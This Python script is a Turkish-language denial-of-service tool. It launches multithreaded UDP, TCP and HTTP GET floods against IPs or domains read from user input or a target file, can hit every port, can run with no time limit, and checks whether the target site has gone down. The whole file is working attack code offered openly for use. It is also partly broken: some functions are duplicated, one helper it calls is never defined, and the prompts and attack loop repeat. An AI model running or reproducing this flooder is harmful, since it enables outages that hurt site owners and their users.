#!/usr/bin/env python3  
# -*- coding: utf-8 -*-  
# Coded by Morbius.os  

import os  
import socket  
import time  
import random  
import sys  
import subprocess  
import platform  
import requests  
import re  
import threading  
import argparse  

# Renkler  
Mor = '\033[95m'; Cyan = '\033[96m'; KoyuMavi = '\033[1;34m'; Mavi = '\033[94m'  
Yeşil = '\033[92m'; Sarı = '\033[93m'; Kırmızı = '\033[91m'; Kalın = '\033[1m'  
AltıÇizili = '\033[4m'; Bitir = '\033[0m'; Beyaz = '\033[1;37m'  

def banner():  
    os.system('cls' if os.name == 'nt' else 'clear')  
    print(f"""{Beyaz} __  __            _     _            {Kırmızı} ____             {Sarı} _____           _
{Beyaz}|  \/  | ___  _ __| |__ (_)_   _ ___  {Kırmızı}|  _ \  ___  ___  {Sarı}|_   _|__   ___ | |
{Beyaz}| |\/| |/ _ \| '__| '_ \| | | | / __| {Kırmızı}| | | |/ _ \/ __|   {Sarı}| |/ _ \ / _ \| |
{Beyaz}| |  | | (_) | |  | |_) | | |_| \__ \ {Kırmızı}| |_| | (_) \__ \   {Sarı}| | (_) | (_) | |
{Beyaz}|_|  |_|\___/|_|  |_.__/|_|\__,_|___/ {Kırmızı}|____/ \___/|___/   {Sarı}|_|\___/ \___/|_|  
{Yeşil}
Author: Morbius.os
Instagram: @morbius.os
Github: https://github.com/morbius-os{Bitir}""")  

def show_help_guide():  
    guide = f"""{Kırmızı}{Kalın}KOMUT SATIRI PARAMETRELERİ:{Bitir}

  -t, --targets    Hedeflerin bulunduğu dosya (her satır IP/domain)  
  -p, --port       Hedef port numarası (tüm portlar için 1)  
  --type           Saldırı tipi: udp, tcp, http  
  -d, --duration   Saldırı süresi saniye cinsinden (0 = süresiz)  
  -T, --threads    Thread sayısı  
  --log            Loglama aktif  
  --logfile        Log dosyası adı (default: log.txt)  

{Sarı}{Kalın}ÖRNEK KULLANIM:{Bitir}

  python3 mdos2.py -t hedefler.txt -p 80 --type udp -d 60 -T 8 --log --logfile kayit.txt

Bu komut 'hedefler.txt' dosyasındaki IP'lere 60 saniye boyunca UDP flood saldırısı yapar,  
port 80'i hedef alır, 8 thread kullanır, loglama yapar ve loglar 'kayit.txt' dosyasına yazılır.
"""  
    print(guide)  

def site_durumu_gözlemle(url, süre_bitiş):
    site_düştü = False
    while time.time() < süre_bitiş:
        if not http_canli_mi(url):
            if not site_düştü:
                print(f"{Kırmızı}\nHEDEF SİTE CEVAP VERMİYOR! DÜŞMÜŞ OLABİLİR!{Bitir}")
                site_düştü = True
        else:
            site_düştü = False
        time.sleep(5)

def site_durumu_gözlemle(url, süre_bitiş):
    site_düştü = False
    while time.time() < süre_bitiş:
        if not http_canli_mi(url):
            if not site_düştü:
                print(f"{Kırmızı}\nHEDEF SİTE CEVAP VERMİYOR! DÜŞMÜŞ OLABİLİR!{Bitir}")
                site_düştü = True
        else:
            site_düştü = False
        time.sleep(5)

def baslangic_secim():  
    print(f"""{Beyaz}Başlangıç Modu Seçiniz:  
{Yeşil}[1]{Beyaz} Uygulama (İnteraktif Mod)  
{Yeşil}[2]{Beyaz} Parametre Modu (Help Guide ve Parametre Açıklamaları)  
{Yeşil}[3]{Beyaz} Çıkış  
""")  
    secim = input(f"{Beyaz}Seçiminiz (1/2/3): {Yeşil}").strip()  
    if secim == '1':  
        return 'interactive'  
    elif secim == '2':  
        show_help_guide()  
        sys.exit()  
    else:  
        print(f"{Kırmızı}Program sonlandırıldı.{Bitir}")  
        sys.exit()  

def ip_gecerli_mi(ip):  
    return re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip) is not None  

def domain_denetle_ve_ip_al(domain):  
    try:  
        ip = socket.gethostbyname(domain)  
        return ip  
    except socket.gaierror:  
        return None  

def ping_kontrol(ip):  
    param = "-n" if platform.system().lower() == "windows" else "-c"  
    try:  
        result = subprocess.run(["ping", param, "1", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  
        return result.returncode == 0  
    except:  
        return False  

def http_kontrol(site_url):  
    try:  
        cevap = requests.get(site_url, timeout=5)  
        return cevap.status_code == 200  
    except:  
        return False  

def hedefleri_dosyadan_oku(dosya_adi):  
    hedefler = []  
    try:  
        with open(dosya_adi, "r") as f:  
            for line in f:  
                line = line.strip()  
                if line:  
                    hedefler.append(line)  
        return hedefler  
    except FileNotFoundError:  
        print(f"{Kırmızı}{dosya_adi} bulunamadı!{Bitir}")  
        return []  

def saldırı_udp(target, port, paket_boyutu, logla, log_dosyasi, süre_bitiş, paket_sayac):
    portlar = range(1, 65535) if port == 1 else [port]
    while time.time() < süre_bitiş:
        for p in portlar:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.sendto(random._urandom(paket_boyutu), (target, p))
                paket_sayac['count'] += 1
                print(f"{Beyaz}UDP {Yeşil}{p}{Beyaz} → {Yeşil}{paket_sayac['count']} paket{Bitir}", end='\r')
                if logla:
                    with open(log_dosyasi, "a") as f:
                        f.write(f"UDP {target}:{p} → {paket_sayac['count']} paket\n")
            except:
                pass
            s.close()
        if time.time() >= süre_bitiş:
            break

def saldırı_tcp(target, port, paket_boyutu, logla, log_dosyasi, süre_bitiş, paket_sayac):
    while time.time() < süre_bitiş:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        try:
            s.connect((target, port))
            s.send(random._urandom(paket_boyutu))
            paket_sayac['count'] += 1
            print(f"{Beyaz}TCP {Yeşil}{port}{Beyaz} → {Yeşil}{paket_sayac['count']} paket{Bitir}", end='\r')
            if logla:
                with open(log_dosyasi, "a") as f:
                    f.write(f"TCP {target}:{port} → {paket_sayac['count']} paket\n")
        except:
            pass
        s.close()

def saldırı_http(target_url, logla, log_dosyasi, süre_bitiş, paket_sayac):
    while time.time() < süre_bitiş:
        try:
            requests.get(target_url, timeout=2)
            paket_sayac['count'] += 1
            print(f"{Beyaz}HTTP GET → {Yeşil}{paket_sayac['count']} istek{Bitir}", end='\r')
            if logla:
                with open(log_dosyasi, "a") as f:
                    f.write(f"HTTP {target_url} → {paket_sayac['count']} istek\n")
        except:
            pass

def hedef_belirle_ve_saldırı_yap(target, port, saldırı_tipi, logla, log_dosyasi, süre, threads, domain=None, http_proto=None):
    print(f"{Sarı}Ping kontrolü yapılıyor...{Bitir}")
    if not ping_kontrol(target):
        print(f"{Kırmızı}Hedef IP {target} ping'e cevap vermiyor. Saldırı başlatılmadı.{Bitir}")
        return

    if saldırı_tipi == 'http':
        if not http_kontrol(f"{http_proto}://{domain}"):
            print(f"{Kırmızı}HTTP kontrolünde hedef site cevap vermiyor.{Bitir}")
            return

    print(f"{Yeşil}Hedef açık. Saldırı başlatılıyor...{Bitir}")
    paket_sayac = {'count': 0}
    süre_bitiş = time.time() + süre if süre > 0 else float('inf')
    paket_boyutu = 1024 if saldırı_tipi != 'http' else 64

    thread_list = []

    for i in range(threads):
        if saldırı_tipi == 'udp':
            t = threading.Thread(target=saldırı_udp, args=(target, port, paket_boyutu, logla, log_dosyasi, süre_bitiş, paket_sayac))
        elif saldırı_tipi == 'tcp':
            t = threading.Thread(target=saldırı_tcp, args=(target, port, paket_boyutu, logla, log_dosyasi, süre_bitiş, paket_sayac))
        elif saldırı_tipi == 'http':
            t = threading.Thread(target=saldırı_http, args=(f"{http_proto}://{domain}", logla, log_dosyasi, süre_bitiş, paket_sayac))
        else:
            return
        t.daemon = True
        t.start()
        thread_list.append(t)

    try:
        while any(t.is_alive() for t in thread_list):
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n{Kırmızı}Saldırı kullanıcı tarafından durduruldu.{Bitir}")
        sys.exit()
        
def hedefleri_dosyadan_oku(dosya_adi):
    hedefler = []
    try:
        with open(dosya_adi, "r") as f:
            for line in f:
                line = line.strip()
                if line:
                    if "." in line:
                        if ip_gecerli_mi(line):
                            hedefler.append((line, None, None))
                        else:
                            ip = domain_denetle_ve_ip_al(line)
                            if ip:
                                hedefler.append((ip, line, "http"))
        return hedefler
    except FileNotFoundError:
        print(f"{Kırmızı}{dosya_adi} bulunamadı!{Bitir}")
        return []

def ana():
    banner()

    parser = argparse.ArgumentParser(description="Gelişmiş DOS Aracı", add_help=False)
    parser.add_argument("-h", "--help", action="store_true", help="Yardım mesajını göster")
    parser.add_argument("--targets", "-t", help="Hedeflerin bulunduğu dosya (her satır IP/domain)", default=None)
    parser.add_argument("--port", "-p", type=int, help="Hedef port numarası (tüm portlar için 1)", default=None)
    parser.add_argument("--type", choices=['udp','tcp','http'], help="Saldırı tipi", default=None)
    parser.add_argument("--duration", "-d", type=int, help="Saldırı süresi saniye cinsinden (0 = süresiz)", default=None)
    parser.add_argument("--threads", "-T", type=int, help="Thread sayısı", default=None)
    parser.add_argument("--log", action="store_true", help="Loglama aktif")
    parser.add_argument("--logfile", help="Log dosyası adı (default: log.txt)", default="log.txt")
    args, unknown = parser.parse_known_args()

    if args.help:
        show_help_guide()
        sys.exit()

    if (args.targets is None and args.port is None and args.type is None 
        and args.duration is None and args.threads is None and not args.log):
        mod = baslangic_secim()
        if mod != 'interactive':
            return

        hedef_listesi = []
        print(f"{Beyaz}Hedef belirleme modu:{Bitir}")
        print(f"{Yeşil}[1]{Beyaz} Tek bir IP/domain gir{Bitir}")
        print(f"{Yeşil}[2]{Beyaz} Hedefleri dosyadan yükle{Bitir}")
        secim = input(f"{Beyaz}Seçiminiz (1/2): {Yeşil}").strip()

        if secim == '2':
            dosya_adi = input(f"{Beyaz}Hedeflerin bulunduğu dosya adını girin: {Yeşil}").strip()
            hedef_listesi = hedefleri_dosyadan_oku(dosya_adi)
            if not hedef_listesi:
                print(f"{Kırmızı}Hedef listesi boş veya okunamadı.{Bitir}")
                sys.exit()
        else:
            while True:
                print(f"{Beyaz}IP adresi girebilirsiniz (örnek: 192.168.1.1) veya 'Domain' yazabilirsiniz.{Bitir}")
                target_input = input(f"{Beyaz}IP ya da 'Domain' giriniz: {Yeşil}").strip()
                is_domain = target_input.lower() == "domain"
                if is_domain:
                    domain = input(f"{Beyaz}Domain (örnek: example.com): {Yeşil}").strip()
                    while "." not in domain:
                        domain = input(f"{Kırmızı}Hatalı domain. Lütfen example.com gibi girin: {Yeşil}").strip()
                    ip = domain_denetle_ve_ip_al(domain)
                    if ip is None:
                        print(f"{Kırmızı}Domain çözümlenemedi!{Bitir}")
                        continue
                    target = ip
                    http_proto = input(f"{Beyaz}HTTP Protokolü (http/https): {Yeşil}").strip()
                    hedef_listesi.append((target, domain, http_proto))
                    break
                else:
                    if not ip_gecerli_mi(target_input):
                        print(f"{Kırmızı}Geçersiz IP formatı!{Bitir}")
                        continue
                    hedef_listesi.append((target_input, None, None))
                    break

    port = args.port if args.port is not None else int(input(f"{Beyaz}Port (tüm portlar için 1): {Yeşil}"))
    süre = args.duration if args.duration is not None else int(input(f"{Beyaz}Saldırı süresi saniye cinsinden (0 = süresiz): {Yeşil}"))
    threads = args.threads if args.threads is not None else int(input(f"{Beyaz}Thread sayısı (örnek 4): {Yeşil}"))

    if not args.log:
        log_cevap = input(f"{Beyaz}Loglama yapmak ister misiniz? (E/H): {Yeşil}").strip().lower()
        if log_cevap == 'e':
            logla = True
            log_dosyasi = input(f"{Beyaz}Log dosyası adı girin (örn: kayit.txt): {Yeşil}").strip()
            if log_dosyasi == "":
                log_dosyasi = "log.txt"
        else:
            logla = False
            log_dosyasi = ""
    else:
        logla = True
        log_dosyasi = args.logfile

    if args.type:
        saldırı_tipi = args.type
    else:
        print(f"{Sarı}Saldırı Tipini Seçin:{Bitir}")
        print(f"{Yeşil}[1]{Beyaz} UDP Flood")
        print(f"{Yeşil}[2]{Beyaz} TCP Flood")
        print(f"{Yeşil}[3]{Beyaz} HTTP GET Flood\n")
        secim = input(f"{Beyaz}Seçiminiz (1/2/3): {Yeşil}")
        if secim == '1':
            saldırı_tipi = 'udp'
        elif secim == '2':
            saldırı_tipi = 'tcp'
        elif secim == '3':
            saldırı_tipi = 'http'
        else:
            print(f"{Kırmızı}Geçersiz seçim!{Bitir}")
            sys.exit()

    for hedef in hedef_listesi:
        if isinstance(hedef, tuple):
            target_ip, domain, http_proto = hedef
        else:
            target_ip, domain, http_proto = hedef, None, None

        print(f"{Beyaz}Hedef: {Yeşil}{target_ip}{Beyaz} Port: {Yeşil}{port}{Beyaz} Tip: {Yeşil}{saldırı_tipi.upper()}{Bitir}")
        
        if saldırı_tipi == "http" and domain and http_proto:
            süre_bitiş = time.time() + süre if süre > 0 else float('inf')
            threading.Thread(target=site_durumu_gözlemle, args=(f"{http_proto}://{domain}", süre_bitiş), daemon=True).start()

        hedef_belirle_ve_saldırı_yap(target_ip, port, saldırı_tipi, logla, log_dosyasi, süre, threads, domain, http_proto)
        print(f"{Kırmızı}Bir sonraki hedefe geçiliyor...{Bitir}")
        time.sleep(2)

    # Loglama ayarı
    if not args.log:
        log_cevap = input(f"{Beyaz}Loglama yapmak ister misiniz? (E/H): {Yeşil}").strip().lower()
        if log_cevap == 'e':
            logla = True
            log_dosyasi = input(f"{Beyaz}Log dosyası adı girin (örn: kayit.txt): {Yeşil}").strip()
            if log_dosyasi == "":
                log_dosyasi = "log.txt"
        else:
            logla = False
            log_dosyasi = ""
    else:
        logla = True
        log_dosyasi = args.logfile

    if args.type:
        saldırı_tipi = args.type
    else:
        print(f"{Sarı}Saldırı Tipini Seçin:{Bitir}")
        print(f"{Yeşil}[1]{Beyaz} UDP Flood")
        print(f"{Yeşil}[2]{Beyaz} TCP Flood ")
        print(f"{Yeşil}[3]{Beyaz} HTTP GET Flood\n")
        secim = input(f"{Beyaz}Seçiminiz (1/2/3): {Yeşil}")
        if secim == '1':
            saldırı_tipi = 'udp'
        elif secim == '2':
            saldırı_tipi = 'tcp'
        elif secim == '3':
            saldırı_tipi = 'http'
        else:
            print(f"{Kırmızı}Geçersiz seçim!{Bitir}")
            sys.exit()

    if süre == 0:
        süre_bitiş = float('inf')
    else:
        süre_bitiş = time.time() + süre

    for hedef in hedef_listesi:
        if isinstance(hedef, tuple):
            target_ip, domain, http_proto = hedef
        else:
            target_ip, domain, http_proto = hedef, None, None

        print(f"{Beyaz}Hedef: {Yeşil}{target_ip}{Beyaz} Port: {Yeşil}{port}{Beyaz} Tip: {Yeşil}{saldırı_tipi.upper()}{Bitir}")

        hedef_belirle_ve_saldırı_yap(target_ip, port, saldırı_tipi, logla, log_dosyasi, süre, threads, domain, http_proto)
        print(f"{Kırmızı}Bir sonraki hedefe geçiliyor...{Bitir}")
        time.sleep(2)

if __name__ == "__main__":
    ana()